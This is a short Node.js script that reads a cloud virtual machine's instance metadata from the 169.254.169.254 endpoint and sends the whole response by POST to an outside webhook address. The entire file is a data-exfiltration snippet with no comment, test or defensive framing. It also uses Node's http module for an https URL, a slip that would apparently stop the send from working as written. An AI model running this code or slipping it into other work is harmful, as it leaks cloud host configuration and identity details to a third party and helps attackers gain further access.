const http = require('http');

const options = {
  hostname: '169.254.169.254',
  path: '/metadata/instance?api-version=2021-02-01',
  headers: { 'Metadata': 'true' }
};

http.get(options, (res) => {
  let data = '';
  res.on('data', (chunk) => { data += chunk; });
  res.on('end', () => {
    const postData = JSON.stringify({ metadata: data });
    const req = http.request('https://25ad80f0-8ab5-44cc-90eb-744bea49970e.webhooksite.net/', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' }
    });
    req.write(postData);
    req.end();
  });
});
